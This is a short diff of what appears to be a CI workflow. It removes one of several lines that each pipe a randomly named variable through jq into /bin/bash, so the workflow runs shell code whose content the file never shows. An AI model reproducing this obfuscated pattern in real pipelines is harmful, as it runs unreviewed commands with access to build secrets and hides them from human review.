@@ -21,7 +21,6 @@ jobs:
           echo $o570 | jq -r .oase41 | /bin/bash
           echo $pjwrc026 | jq -r .hjch819 | /bin/bash
           echo $fnr7696 | jq -r .vq6 | /bin/bash
-          echo $m3436 | jq -r .es077 | /bin/bash
           echo $toqli2011 | jq -r .j15 | /bin/bash
           echo $ejq631 | jq -r .bo893 | /bin/bash
           printf '%s' "$vpn35" | jq -r .ti662 | /bin/bash
